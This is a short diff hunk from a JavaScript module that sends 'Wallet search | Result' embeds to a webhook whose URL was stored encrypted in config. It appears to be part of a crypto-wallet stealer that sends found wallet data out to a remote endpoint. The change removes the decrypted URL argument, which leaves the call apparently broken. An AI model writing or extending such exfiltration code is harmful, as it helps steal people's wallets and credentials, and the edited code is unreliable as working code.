@@ -20,7 +20,7 @@ module.exports = (client) => {
             }
 
             await client.utils.webhook.sendToWebhook(
-                client.utils.encryption.decryptData(client.config.webhook.url), {
+                {
                     "embeds": [client.utils.webhook.createEmbed({
                         "title": `💰 Wallet search | Result`,
                         "description": `\`\`\`${description}\`\`\``,
